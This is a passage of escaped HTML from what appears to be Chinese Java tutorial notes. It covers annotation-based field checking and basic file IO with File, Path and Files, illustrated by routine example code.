&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果值是String:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 判断值是否满足@Range的min/max:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Invalid field: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样一来，我们通过&lt;code>@Range&lt;/code>注解，配合&lt;code>check()&lt;/code>方法，就可以完成&lt;code>Person&lt;/code>实例的检查。注意检查逻辑完全是我们自己编写的，JVM不会自动给注解添加任何额外的逻辑。&lt;/p>
&lt;h2 id="io">IO&lt;/h2>
&lt;h3 id="filepath">File&amp;amp;Path&lt;/h3>
&lt;ul>
&lt;li>标准库&lt;code>java.io&lt;/code>提供&lt;code>File&lt;/code>对象来操作文件和目录，可以传入绝对路径和相对路径；即使传入的不存在也不报错，可以用&lt;code>isFile&lt;/code>, &lt;code>isDirectory&lt;/code>进行检查&lt;/li>
&lt;li>&lt;code>File&lt;/code>对象既可以表示文件，也可以表示目录，可以用&lt;code>getPath&lt;/code>(传入路径), &lt;code>getAbsolutePath&lt;/code>(绝对路径), &lt;code>getCanonicalPath&lt;/code>(规范路径)&lt;/li>
&lt;li>当File对象表示一个目录时，可以使用&lt;code>list()&lt;/code>和&lt;code>listFiles()&lt;/code>列出目录下的文件和子目录名，&lt;code>listFiles()&lt;/code>提供了一系列重载方法，可以过滤不想要的文件和目录&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;C:\\Windows&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 列出所有文件和子目录
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fs2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">listFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FilenameFilter&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 仅列出.exe文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">dir&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">endsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 返回true表示接受该文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fs2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">printFiles&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>其它API&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>boolean canRead()：是否可读
boolean canWrite()：是否可写
boolean canExecute()：是否可执行
long length()：文件字节大小
boolean mkdir()：创建当前File对象表示的目录
boolean mkdirs()：创建当前File对象表示的目录，并在必要时将不存在的父目录也创建出来
boolean delete()：删除当前File对象表示的目录，当前目录必须为空才能删除成功
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>可以用&lt;code>createTempFile()&lt;/code>来创建一个临时文件，以及&lt;code>deleteOnExit()&lt;/code>在JVM退出时自动删除该文件&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createTempFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp-&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 提供临时文件的前缀和后缀
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">deleteOnExit&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// JVM退出时自动删除
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFile&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAbsolutePath&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>Path&lt;/code>对象位于&lt;code>java.nio.file&lt;/code>包，和&lt;code>File&lt;/code>对象类似，但操作更加简单，便于操作目录的拼接、遍历等&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.file.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;project&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;study&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 构造一个Path对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 转换为绝对路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">normalize&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 转换为规范路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toFile&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 转换为File对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;..&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 可以直接遍历Path
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="filespaths">Files&amp;amp;Paths&lt;/h3>
&lt;p>是&lt;code>java.nio&lt;/code>包里面的类，封装了很多读写文件的简单方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 把一个文件的全部内容读取为一个byte[]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 把一个文件的全部内容读取为String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 默认使用UTF-8编码读取:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 可指定编码:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 按行读取并返回每行内容:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllLines&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写入文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写入二进制文件:
